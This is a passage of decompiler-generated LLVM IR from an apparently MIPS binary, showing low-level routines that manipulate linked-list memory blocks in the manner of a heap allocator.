  %v2_406144 = call i32 @function_406884(i32 %v3_406140)
  store i32 %v2_406088, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_406154

dec_label_pc_406154:                              ; preds = %dec_label_pc_4060a8, %dec_label_pc_406138
  %v3_406158 = load i32, i32* bitcast (i32** @global_var_449448.327 to i32*), align 4
  store i32 %v0_406094, i32* %s2.global-to-local, align 4
  store i32 %v0_406098, i32* @s1, align 4
  store i32 %v0_40609c, i32* @s0, align 4
  %v5_40616c = call i32 @function_406884(i32 %v3_406158)
  br label %dec_label_pc_406174

dec_label_pc_406174:                              ; preds = %dec_label_pc_406104, %dec_label_pc_406154
  %v0_406174 = load i32, i32* @s0, align 4
  %v1_406174 = add i32 %v0_406174, 4
  %v2_406174 = inttoptr i32 %v1_406174 to i32*
  %v3_406174 = load i32, i32* %v2_406174, align 4
  store i32 %v3_406174, i32* %v1.global-to-local, align 4
  %v1_40617c = icmp eq i32 %v3_406174, 0
  br i1 %v1_40617c, label %dec_label_pc_406190, label %dec_label_pc_406180

dec_label_pc_406180:                              ; preds = %dec_label_pc_406174
  %v1_406184 = add i32 %v0_406174, 8
  %v2_406184 = inttoptr i32 %v1_406184 to i32*
  %v3_406184 = load i32, i32* %v2_406184, align 4
  %v2_40618c = add i32 %v3_406174, 8
  %v3_40618c = inttoptr i32 %v2_40618c to i32*
  store i32 %v3_406184, i32* %v3_40618c, align 4
  %v0_406190.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_406190

dec_label_pc_406190:                              ; preds = %dec_label_pc_406174, %dec_label_pc_406180
  %v0_406190 = phi i32 [ %v0_406174, %dec_label_pc_406174 ], [ %v0_406190.pre, %dec_label_pc_406180 ]
  %v1_406190 = add i32 %v0_406190, 8
  %v2_406190 = inttoptr i32 %v1_406190 to i32*
  %v3_406190 = load i32, i32* %v2_406190, align 4
  %v1_406194 = add i32 %v0_406190, 4
  %v2_406194 = inttoptr i32 %v1_406194 to i32*
  %v3_406194 = load i32, i32* %v2_406194, align 4
  store i32 %v3_406194, i32* %v1.global-to-local, align 4
  %v1_406198 = icmp eq i32 %v3_406190, 0
  br i1 %v1_406198, label %dec_label_pc_4061a8, label %dec_label_pc_40619c

dec_label_pc_40619c:                              ; preds = %dec_label_pc_406190
  %v2_4061a4 = add i32 %v3_406190, 4
  %v3_4061a4 = inttoptr i32 %v2_4061a4 to i32*
  store i32 %v3_406194, i32* %v3_4061a4, align 4
  %v0_4061b0.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4061a8

dec_label_pc_4061a8:                              ; preds = %dec_label_pc_406190, %dec_label_pc_40619c
  %v0_4061b0 = phi i32 [ %v3_406194, %dec_label_pc_406190 ], [ %v0_4061b0.pre, %dec_label_pc_40619c ]
  %v0_4061a8 = load i32, i32* %gp.global-to-local, align 4
  %v1_4061a8 = add i32 %v0_4061a8, -32160
  %v2_4061a8 = inttoptr i32 %v1_4061a8 to i32*
  %v3_4061a8 = load i32, i32* %v2_4061a8, align 4
  %v2_4061b0 = inttoptr i32 %v3_4061a8 to i32*
  store i32 %v0_4061b0, i32* %v2_4061b0, align 4
  %v0_4061b4 = load i32, i32* %gp.global-to-local, align 4
  %v1_4061b4 = add i32 %v0_4061b4, -32228
  %v2_4061b4 = inttoptr i32 %v1_4061b4 to i32*
  %v3_4061b4 = load i32, i32* %v2_4061b4, align 4
  call void @__pseudo_call(i32 %v3_4061b4)
  store i32 %v2_406088, i32* %gp.global-to-local, align 4
  %v0_4061c8 = load i32, i32* @s0, align 4
  %v1_4061c8 = load i32, i32* %s2.global-to-local, align 4
  %v3_4061cc = load i32, i32* @global_var_449488.336, align 4
  store i32 %v3_4061cc, i32* @t9, align 4
  %v2_4061d4 = load i32, i32* @s1, align 4
  %v2_4061c8 = add i32 %v0_4061c8, 12
  %v1_4061d0 = sub i32 %v2_4061c8, %v1_4061c8
  %v3_4061d4 = sub i32 %v1_4061d0, %v2_4061d4
  %v5_4061d4 = call i32 @function_407460(i32 %v3_4061d4)
  store i32 %v2_406088, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_406884.308 to i32), i32* @t9, align 4
  br label %dec_label_pc_4061f4

dec_label_pc_4061f4:                              ; preds = %dec_label_pc_406080, %dec_label_pc_4061a8
  %.0 = phi i32 [ undef, %dec_label_pc_406080 ], [ %v5_4061d4, %dec_label_pc_4061a8 ]
  store i32 %v0_406090, i32* @ra, align 4
  store i32 %v0_406094, i32* @s2, align 4
  store i32 %v0_406098, i32* @s1, align 4
  store i32 %v0_40609c, i32* @s0, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_406190, { 1, 0 }
  uselistorder i32 %v0_40609c, { 1, 0 }
  uselistorder i32 %v0_406098, { 1, 0 }
  uselistorder i32 %v0_406094, { 1, 0 }
  uselistorder i32 %v2_406088, { 3, 2, 6, 5, 4, 1, 0, 7 }
  uselistorder i32* %s2.global-to-local, { 1, 0, 2 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 5, 6, 2, 3, 4, 7, 8, 9 }
  uselistorder i32 undef, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32)* @function_407460, { 3, 2, 1, 0 }
  uselistorder i32* @s2, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 31 }
  uselistorder label %dec_label_pc_4061f4, { 1, 0 }
  uselistorder label %dec_label_pc_4061a8, { 1, 0 }
  uselistorder label %dec_label_pc_406190, { 1, 0 }
  uselistorder label %dec_label_pc_406174, { 1, 0 }
  uselistorder label %dec_label_pc_406154, { 1, 0 }
}

define i32 @function_406210(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406210:
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %v1_406210 = inttoptr i32 %arg2 to i32*
  %v2_406210 = load i32, i32* %v1_406210, align 4
  store i32 -4, i32* %v1.global-to-local, align 4
  %v1_406218 = add i32 %v2_406210, 3
  %v2_40621c = and i32 %v1_406218, -4
  store i32 %v2_40621c, i32* @a2, align 4
  %v1_406220 = icmp ult i32 %v2_40621c, 12
  %v2_406220 = zext i1 %v1_406220 to i32
  store i32 %v2_406220, i32* %v0.global-to-local, align 4
  %v1_406224 = icmp eq i1 %v1_406220, false
  br i1 %v1_406224, label %dec_label_pc_406230, label %dec_label_pc_406228

dec_label_pc_406228:                              ; preds = %dec_label_pc_406210
  store i32 12, i32* @a2, align 4
  br label %dec_label_pc_406230

dec_label_pc_406230:                              ; preds = %dec_label_pc_406210, %dec_label_pc_406228
  %v3_406254 = phi i32 [ %v2_40621c, %dec_label_pc_406210 ], [ 12, %dec_label_pc_406228 ]
  %v2_406230 = load i32, i32* %arg1, align 4
  store i32 %v2_406230, i32* %v1.global-to-local, align 4
  %v3_406248 = add i32 %v3_406254, 44
  br label %dec_label_pc_40623c

dec_label_pc_40623c:                              ; preds = %dec_label_pc_4062b4, %dec_label_pc_406230
  %v0_4062b4 = phi i32 [ %v3_4062b4, %dec_label_pc_4062b4 ], [ %v2_406230, %dec_label_pc_406230 ]
  %v1_40623c = inttoptr i32 %v0_4062b4 to i32*
  %v2_40623c = load i32, i32* %v1_40623c, align 4
  store i32 %v2_40623c, i32* @a3, align 4
  %v2_406244 = icmp ult i32 %v2_40623c, %v3_406254
  store i32 %v3_406248, i32* %v0.global-to-local, align 4
  br i1 %v2_406244, label %dec_label_pc_4062b4, label %dec_label_pc_40624c

dec_label_pc_40624c:                              ; preds = %dec_label_pc_40623c
  %v2_406250 = icmp ult i32 %v2_40623c, %v3_406248
  %v1_406254 = icmp eq i1 %v2_406250, false
  %v4_406254 = sub i32 %v2_40623c, %v3_406254
  store i32 %v4_406254, i32* %v0.global-to-local, align 4
  br i1 %v1_406254, label %dec_label_pc_4062a0, label %dec_label_pc_406258

dec_label_pc_406258:                              ; preds = %dec_label_pc_40624c
  %v1_40625c = add i32 %v0_4062b4, 4
  %v2_40625c = inttoptr i32 %v1_40625c to i32*
  %v3_40625c = load i32, i32* %v2_40625c, align 4
  %v1_406264 = icmp eq i32 %v3_40625c, 0
  br i1 %v1_406264, label %dec_label_pc_406278, label %dec_label_pc_406268

dec_label_pc_406268:                              ; preds = %dec_label_pc_406258
  %v1_40626c = add i32 %v0_4062b4, 8
  %v2_40626c = inttoptr i32 %v1_40626c to i32*
  %v3_40626c = load i32, i32* %v2_40626c, align 4
  store i32 %v3_40626c, i32* %v0.global-to-local, align 4
  %v2_406274 = add i32 %v3_40625c, 8
  %v3_406274 = inttoptr i32 %v2_406274 to i32*
  store i32 %v3_40626c, i32* %v3_406274, align 4
  %v0_406278.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406278

dec_label_pc_406278:                              ; preds = %dec_label_pc_406258, %dec_label_pc_406268
  %v0_406278 = phi i32 [ %v0_4062b4, %dec_label_pc_406258 ], [ %v0_406278.pre, %dec_label_pc_406268 ]
  %v1_406278 = add i32 %v0_406278, 8
  %v2_406278 = inttoptr i32 %v1_406278 to i32*
  %v3_406278 = load i32, i32* %v2_406278, align 4
  store i32 %v3_406278, i32* %v0.global-to-local, align 4
  %v1_40627c = add i32 %v0_406278, 4
  %v2_40627c = inttoptr i32 %v1_40627c to i32*
  %v3_40627c = load i32, i32* %v2_40627c, align 4
  store i32 %v3_40627c, i32* %t0.global-to-local, align 4
  %v1_406280 = icmp eq i32 %v3_406278, 0
  br i1 %v1_406280, label %dec_label_pc_406294, label %dec_label_pc_406284

dec_label_pc_406284:                              ; preds = %dec_label_pc_406278
  %v2_406290 = add i32 %v3_406278, 4
  %v3_406290 = inttoptr i32 %v2_406290 to i32*
  store i32 %v3_40627c, i32* %v3_406290, align 4
  %v0_40629c.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_406294

dec_label_pc_406294:                              ; preds = %dec_label_pc_406278, %dec_label_pc_406284
  %v0_40629c = phi i32 [ %v3_40627c, %dec_label_pc_406278 ], [ %v0_40629c.pre, %dec_label_pc_406284 ]
  %v0_406294 = load i32, i32* @a3, align 4
  store i32 %v0_406294, i32* @a2, align 4
  store i32 %v0_40629c, i32* %arg1, align 4
  %v0_4062a0.pre = load i32, i32* %v0.global-to-local, align 4
  %v1_4062a0.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4062a0

dec_label_pc_4062a0:                              ; preds = %dec_label_pc_40624c, %dec_label_pc_406294
  %v1_4062a0 = phi i32 [ %v0_4062b4, %dec_label_pc_40624c ], [ %v1_4062a0.pre, %dec_label_pc_406294 ]
  %v0_4062a0 = phi i32 [ %v4_406254, %dec_label_pc_40624c ], [ %v0_4062a0.pre, %dec_label_pc_406294 ]
  %v2_4062a0 = inttoptr i32 %v1_4062a0 to i32*
  store i32 %v0_4062a0, i32* %v2_4062a0, align 4
  %v0_4062a4 = load i32, i32* %v1.global-to-local, align 4
  %v1_4062a4 = load i32, i32* @a3, align 4
  %v2_4062a4 = sub i32 %v0_4062a4, %v1_4062a4
  %v1_4062a8 = add i32 %v2_4062a4, 12
  store i32 %v1_4062a8, i32* %v0.global-to-local, align 4
  %v1_4062ac = load i32, i32* @a2, align 4
  store i32 %v1_4062ac, i32* %v1_406210, align 4
  ret i32 %v1_4062a8

dec_label_pc_4062b4:                              ; preds = %dec_label_pc_40623c
  %v1_4062b4 = add i32 %v0_4062b4, 4
  %v2_4062b4 = inttoptr i32 %v1_4062b4 to i32*
  %v3_4062b4 = load i32, i32* %v2_4062b4, align 4
  store i32 %v3_4062b4, i32* %v1.global-to-local, align 4
  %v1_4062bc = icmp eq i32 %v3_4062b4, 0
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v1_4062bc, label %dec_label_pc_4062c0, label %dec_label_pc_40623c

dec_label_pc_4062c0:                              ; preds = %dec_label_pc_4062b4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_4062b4, { 1, 2, 0 }
  uselistorder i32 %v0_406278, { 1, 0 }
  uselistorder i32 %v2_40623c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_4062b4, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v3_406254, { 2, 1, 0 }
  uselistorder i32* %v1.global-to-local, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %v0.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder label %dec_label_pc_4062a0, { 1, 0 }
  uselistorder label %dec_label_pc_406294, { 1, 0 }
  uselistorder label %dec_label_pc_406278, { 1, 0 }
  uselistorder label %dec_label_pc_406230, { 1, 0 }
}

define i32 @function_4062d0(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4062d0:
  %v2_4062d0 = add i32 %arg2, 4
  %v3_4062d0 = inttoptr i32 %v2_4062d0 to i32*
  store i32 %arg4, i32* %v3_4062d0, align 4
  %v1_4062d4 = icmp eq i32 %arg3, 0
  %v4_4062d4 = add i32 %arg2, 8
  %v5_4062d4 = inttoptr i32 %v4_4062d4 to i32*
  store i32 %arg3, i32* %v5_4062d4, align 4
  br i1 %v1_4062d4, label %dec_label_pc_4062e4, label %dec_label_pc_4062d8

dec_label_pc_4062d8:                              ; preds = %dec_label_pc_4062d0
  %v2_4062e0 = add i32 %arg3, 4
  %v3_4062e0 = inttoptr i32 %v2_4062e0 to i32*
  store i32 %arg2, i32* %v3_4062e0, align 4
  br label %dec_label_pc_4062e4

dec_label_pc_4062e4:                              ; preds = %dec_label_pc_4062d0, %dec_label_pc_4062d8
  store i32 %arg2, i32* %arg1, align 4
  %v1_4062e8 = icmp eq i32 %arg4, 0
  br i1 %v1_4062e8, label %dec_label_pc_4062f4, label %dec_label_pc_4062ec

dec_label_pc_4062ec:                              ; preds = %dec_label_pc_4062e4
  %v2_4062f0 = add i32 %arg4, 8
  %v3_4062f0 = inttoptr i32 %v2_4062f0 to i32*
  store i32 %arg2, i32* %v3_4062f0, align 4
  br label %dec_label_pc_4062f4

dec_label_pc_4062f4:                              ; preds = %dec_label_pc_4062e4, %dec_label_pc_4062ec
  %v1_4062f4 = load i32, i32* @v0, align 4
  ret i32 %v1_4062f4

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_4062f4, { 1, 0 }
  uselistorder label %dec_label_pc_4062e4, { 1, 0 }
}

define i32 @function_4062fc(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4062fc:
  %v1_4062fc = icmp eq i32 %arg3, 0
  br i1 %v1_4062fc, label %dec_label_pc_40630c, label %dec_label_pc_406300

dec_label_pc_406300:                              ; preds = %dec_label_pc_4062fc
  %v2_406308 = add i32 %arg3, 4
  %v3_406308 = inttoptr i32 %v2_406308 to i32*
  store i32 %arg2, i32* %v3_406308, align 4
  br label %dec_label_pc_40630c

dec_label_pc_40630c:                              ; preds = %dec_label_pc_4062fc, %dec_label_pc_406300
  store i32 %arg2, i32* %arg1, align 4
  %v3_406310 = add i32 %arg2, 8
  %v4_406310 = inttoptr i32 %v3_406310 to i32*
  store i32 %arg3, i32* %v4_406310, align 4
  %v5_406310 = load i32, i32* @v0, align 4
  ret i32 %v5_406310

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_40630c, { 1, 0 }
}

define i32 @function_406318(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406318:
  %a2.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  %v2_40633c = load i32, i32* %arg1, align 4
  store i32 %v2_40633c, i32* %s0.global-to-local, align 4
  %v1_406340 = load i32, i32* %a2.global-to-local, align 4
  %v2_406340 = add i32 %v1_406340, %arg2
  store i32 %v2_406340, i32* %t0.global-to-local, align 4
  store i32 0, i32* @t1, align 4
  %.old = load i32, i32* @v0, align 4
  %v1_40634c.old = icmp eq i32 %.old, 0
  br i1 %v1_40634c.old, label %dec_label_pc_406374, label %dec_label_pc_406350

dec_label_pc_406350:                              ; preds = %dec_label_pc_406318, %dec_label_pc_406350
  %v0_406354 = phi i32 [ %v3_406358, %dec_label_pc_406350 ], [ %v2_40633c, %dec_label_pc_406318 ]
  store i32 %v0_406354, i32* @t1, align 4
  %v1_406358 = add i32 %v0_406354, 4
  %v2_406358 = inttoptr i32 %v1_406358 to i32*
  %v3_406358 = load i32, i32* %v2_406358, align 4
  store i32 %v3_406358, i32* %s0.global-to-local, align 4
  %v1_406360 = add i32 %v3_406358, 12
  %v1_406364 = icmp eq i32 %v3_406358, 0
  %v4_406364 = icmp ult i32 %v1_406360, %arg2
  %v1_40634c = icmp eq i1 %v4_406364, false
  %or.cond = or i1 %v1_406364, %v1_40634c
  br i1 %or.cond, label %dec_label_pc_406374, label %dec_label_pc_406350

dec_label_pc_406374:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406318
  %v0_4063ac = phi i32 [ 0, %dec_label_pc_406318 ], [ %v0_406354, %dec_label_pc_406350 ]
  %v0_4063b4 = phi i32 [ %v2_40633c, %dec_label_pc_406318 ], [ %v3_406358, %dec_label_pc_406350 ]
  %v1_406374 = inttoptr i32 %v0_4063b4 to i32*
  %v2_406374 = load i32, i32* %v1_406374, align 4
  %v2_40637c = sub i32 %v0_4063b4, %v2_406374
  %v1_406380 = add i32 %v2_40637c, 12
  %v2_406384 = icmp ult i32 %v2_406340, %v1_406380
  br i1 %v2_406384, label %dec_label_pc_406444, label %dec_label_pc_40638c

dec_label_pc_40638c:                              ; preds = %dec_label_pc_406374
  %v2_406390 = icmp eq i32 %v1_406380, %v2_406340
  %v5_406390 = add i32 %v2_406374, %v1_406340
  store i32 %v5_406390, i32* %s2.global-to-local, align 4
  br i1 %v2_406390, label %dec_label_pc_406394, label %dec_label_pc_4063cc

dec_label_pc_406394:                              ; preds = %dec_label_pc_40638c
  %v1_406398 = icmp ne i32 %v0_4063ac, 0
  %v3_406398 = add i32 %v0_4063ac, 12
  %v2_4063a0 = icmp eq i32 %v3_406398, %arg2
  %or.cond1 = and i1 %v1_406398, %v2_4063a0
  br i1 %or.cond1, label %dec_label_pc_4063a4, label %dec_label_pc_406438

dec_label_pc_4063a4:                              ; preds = %dec_label_pc_406394
  %v3_4063a8 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  store i32 %v3_4063a8, i32* %t9.global-to-local, align 4
  %v1_4063ac = inttoptr i32 %v0_4063ac to i32*
  %v2_4063ac = load i32, i32* %v1_4063ac, align 4
  %v1_4063b0 = add i32 %v0_4063ac, 8
  %v2_4063b0 = inttoptr i32 %v1_4063b0 to i32*
  %v3_4063b0 = load i32, i32* %v2_4063b0, align 4
  store i32 %v3_4063b0, i32* %a2.global-to-local, align 4
  %v1_4063b8 = add i32 %v3_4063a8, 25340
  store i32 %v1_4063b8, i32* %t9.global-to-local, align 4
  %v3_4063bc = add i32 %v2_4063ac, %v5_406390
  store i32 %v3_4063bc, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4063b8)
  %v0_4063cc.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4063cc

dec_label_pc_4063cc:                              ; preds = %dec_label_pc_40638c, %dec_label_pc_4063a4
  %v0_4063cc = phi i32 [ %v0_4063b4, %dec_label_pc_40638c ], [ %v0_4063cc.pre, %dec_label_pc_4063a4 ]
  %v1_4063cc = add i32 %v0_4063cc, 4
  %v2_4063cc = inttoptr i32 %v1_4063cc to i32*
  %v3_4063cc = load i32, i32* %v2_4063cc, align 4
  store i32 %v3_4063cc, i32* %s1.global-to-local, align 4
  %v1_4063d4 = icmp eq i32 %v3_4063cc, 0
  br i1 %v1_4063d4, label %dec_label_pc_406418, label %dec_label_pc_4063d8

dec_label_pc_4063d8:                              ; preds = %dec_label_pc_4063cc
  %v1_4063dc = inttoptr i32 %v3_4063cc to i32*
  %v2_4063dc = load i32, i32* %v1_4063dc, align 4
  %v2_4063e4 = sub i32 %v3_4063cc, %v2_4063dc
  %v1_4063e8 = add i32 %v2_4063e4, 12
  %v0_4063ec = load i32, i32* %t0.global-to-local, align 4
  %v2_4063ec = icmp eq i32 %v0_4063ec, %v1_4063e8
  br i1 %v2_4063ec, label %dec_label_pc_4063f0, label %dec_label_pc_406418

dec_label_pc_4063f0:                              ; preds = %dec_label_pc_4063d8
  %v3_4063f4 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v0_4063f8 = load i32, i32* @t1, align 4
  store i32 %v0_4063f8, i32* %a2.global-to-local, align 4
  %v1_406400 = add i32 %v3_4063f4, 25340
  store i32 %v1_406400, i32* %t9.global-to-local, align 4
  %v1_406404 = load i32, i32* %s2.global-to-local, align 4
  %v3_406404 = add i32 %v1_406404, %v2_4063dc
  store i32 %v3_406404, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406400)
  %v0_406414 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_406414, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406418

dec_label_pc_406418:                              ; preds = %dec_label_pc_4063d8, %dec_label_pc_4063cc, %dec_label_pc_4063f0
  %v0_40641c = phi i32 [ %v0_4063cc, %dec_label_pc_4063d8 ], [ %v0_4063cc, %dec_label_pc_4063cc ], [ %v0_406414, %dec_label_pc_4063f0 ]
  %v3_406418 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_40641c = load i32, i32* %a2.global-to-local, align 4
  %v2_40641c = add i32 %v1_40641c, %v0_40641c
  store i32 %v2_40641c, i32* %s0.global-to-local, align 4
  %v0_406424 = load i32, i32* @t1, align 4
  store i32 %v0_406424, i32* %a2.global-to-local, align 4
  %v1_406428 = add i32 %v3_406418, 25296
  store i32 %v1_406428, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406428)
  %v0_406440.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_406438

dec_label_pc_406438:                              ; preds = %dec_label_pc_406394, %dec_label_pc_406418
  %v0_406440 = phi i32 [ %v5_406390, %dec_label_pc_406394 ], [ %v0_406440.pre, %dec_label_pc_406418 ]
  %v0_406438 = phi i32 [ %v0_4063b4, %dec_label_pc_406394 ], [ %v2_40641c, %dec_label_pc_406418 ]
  store i32 %v0_406438, i32* %s1.global-to-local, align 4
  %v2_406440 = inttoptr i32 %v0_406438 to i32*
  store i32 %v0_406440, i32* %v2_406440, align 4
  %v0_406448.pre = load i32, i32* %t0.global-to-local, align 4
  %v0_40644c.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_406444

dec_label_pc_406444:                              ; preds = %dec_label_pc_406374, %dec_label_pc_406438
  %v0_40644c = phi i32 [ %v1_406340, %dec_label_pc_406374 ], [ %v0_40644c.pre, %dec_label_pc_406438 ]
  %v0_406448 = phi i32 [ %v2_406340, %dec_label_pc_406374 ], [ %v0_406448.pre, %dec_label_pc_406438 ]
  %v3_406444 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  store i32 %v3_406444, i32* %t9.global-to-local, align 4
  %v1_406448 = add i32 %v0_406448, -12
  store i32 %v1_406448, i32* %s1.global-to-local, align 4
  %v3_40644c = inttoptr i32 %v1_406448 to i32*
  store i32 %v0_40644c, i32* %v3_40644c, align 4
  %v0_406450 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_406450, i32* @a3, align 4
  %v0_406454 = load i32, i32* @t1, align 4
  store i32 %v0_406454, i32* %a2.global-to-local, align 4
  %v0_406458 = load i32, i32* %t9.global-to-local, align 4
  %v1_406458 = add i32 %v0_406458, 25296
  store i32 %v1_406458, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406458)
  %v0_406468 = load i32, i32* %s1.global-to-local, align 4
  ret i32 %v0_406468

; uselistorder directives
  uselistorder i32 %v0_406438, { 1, 0 }
  uselistorder i32 %v3_4063cc, { 1, 0, 2, 3 }
  uselistorder i32 %v5_406390, { 1, 0, 2 }
  uselistorder i32 %v0_4063b4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_4063ac, { 1, 0, 3, 2 }
  uselistorder i32 %v3_406358, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_406354, { 0, 2, 1 }
  uselistorder i32 %v1_406340, { 2, 0, 1 }
  uselistorder i32 %v2_40633c, { 1, 0, 2 }
  uselistorder i32* %s2.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32* %s0.global-to-local, { 4, 0, 1, 3, 2, 5 }
  uselistorder i32* %a2.global-to-local, { 2, 3, 4, 6, 5, 7, 0, 1 }
  uselistorder i32* @t1, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_406444, { 1, 0 }
  uselistorder label %dec_label_pc_406438, { 1, 0 }
  uselistorder label %dec_label_pc_406418, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4063cc, { 1, 0 }
  uselistorder label %dec_label_pc_406350, { 1, 0 }
}

define i32 @function_406490(i32 %arg1) local_unnamed_addr {
dec_label_pc_406490:
  %s1.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_406498 = load i32, i32* @t9, align 4
  %v2_4064bc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_4064bc, i32* @s0, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  %v5_4064c4 = call i32 @function_40688c(i32 %v2_4064bc, i32 ptrtoint (i32* @global_var_406884.308 to i32))
  %v3_4064d8 = load i32, i32* @global_var_449308, align 4
  %v2_4064dc = call i32 @function_406884(i32 %v3_4064d8)
  %v1_4064ec = add i32 %v1_406498, 273784
  %v2_4064ec = inttoptr i32 %v1_4064ec to i32*
  %v3_4064ec = load i32, i32* %v2_4064ec, align 4
  store i32 %v3_4064ec, i32* @v0, align 4
  %v1_4064f4 = inttoptr i32 %v3_4064ec to i32*
  %v2_4064f4 = load i32, i32* %v1_4064f4, align 4
  %v1_4064fc = icmp eq i32 %v2_4064f4, 0
  br i1 %v1_4064fc, label %dec_label_pc_406514, label %dec_label_pc_406500

dec_label_pc_406500:                              ; preds = %dec_label_pc_406490
  store i32 ptrtoint (i32* @global_var_40650c.349 to i32), i32* @ra, align 4
  call void @__pseudo_call(i32 %v2_4064f4)
  br label %dec_label_pc_406514

dec_label_pc_406514:                              ; preds = %dec_label_pc_406490, %dec_label_pc_406500
  %v3_40651c = call i32 @function_40688c(i32 %v2_4064bc, i32 1)
  %v3_40652c = load i32, i32* @global_var_4494a4.350, align 4
  store i32 %v3_40652c, i32* @t9, align 4
  %v1_406534 = call i32 @function_4067c0()
  %v3_406544 = load i32, i32* @global_var_449310.351, align 4
  %v1_40654c = icmp eq i32 %v3_406544, 0
  br i1 %v1_40654c, label %dec_label_pc_40656c, label %dec_label_pc_406550

dec_label_pc_406550:                              ; preds = %dec_label_pc_406514
  %v1_40655c = call i32 @unknown_0()
  br label %dec_label_pc_40656c

dec_label_pc_40656c:                              ; preds = %dec_label_pc_406514, %dec_label_pc_406550
  %v3_40656c = load i32, i32* @global_var_449330.352, align 4
  store i32 %v3_40656c, i32* @t9, align 4
  %v1_406574 = load i32, i32* %s1.global-to-local, align 4
  %v3_406574 = call i32 @function_406e60(i32 %v1_406574)
  unreachable

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_40688c, { 1, 0, 4, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_406884.308 to i32), { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_40656c, { 1, 0 }
  uselistorder label %dec_label_pc_406514, { 1, 0 }
}

define i32 @function_406580(i32 %arg1) local_unnamed_addr {
dec_label_pc_406580:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp6 = alloca i32, align 4
  %tmp8 = alloca i32, align 4
  %tmp9 = alloca i32, align 4
  %tmp10 = alloca i32, align 4
  %v1_406588 = load i32, i32* @t9, align 4
  %v2_406588 = add i32 %v1_406588, 306256
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  %v4_4065a0 = ptrtoint i32* %tmp6 to i32
  %v1_4065a8 = icmp eq i32 %arg1, 0
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_4065a8, label %dec_label_pc_40678c, label %dec_label_pc_4065ac

dec_label_pc_4065ac:                              ; preds = %dec_label_pc_406580
  %v2_4065b4 = ptrtoint i32* %tmp8 to i32
  store i32 %v2_4065b4, i32* %a1.global-to-local, align 4
  %v0_4065b8.pre = load i32, i32* @v0, align 4
  br label %dec_label_pc_4065b8

dec_label_pc_4065b8:                              ; preds = %dec_label_pc_4065b8, %dec_label_pc_4065ac
  %v0_4065b8 = phi i32 [ %v4_4065c4, %dec_label_pc_4065b8 ], [ %v0_4065b8.pre, %dec_label_pc_4065ac ]
  %v1_4065b8 = add i32 %v0_4065b8, 8
  %v2_4065b8 = inttoptr i32 %v1_4065b8 to i32*
